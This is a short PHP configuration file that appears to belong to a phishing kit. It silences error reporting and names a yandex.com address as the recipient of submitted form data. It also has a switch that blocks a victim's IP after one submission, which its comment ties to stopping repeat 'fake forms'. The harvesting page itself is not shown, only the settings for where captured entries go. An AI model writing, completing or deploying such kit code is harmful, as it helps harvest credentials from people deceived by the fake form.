<?php
/*
****** FUNCTION CONTROL: 1=ON  and 0=OFF ****
EXAMPLE
$Example=1;  // Function On
$Example=0;  // Function Off
*/
error_reporting(0);
$Your_Email = "awesome.ch4se@yandex.com";  // Set your email
$One_Time_Access=1; // One Time Access: This Blocks The Users Ip After The Form Has Been Submitted I.E. Prevents Users Sending Multiple Fake Forms

?>


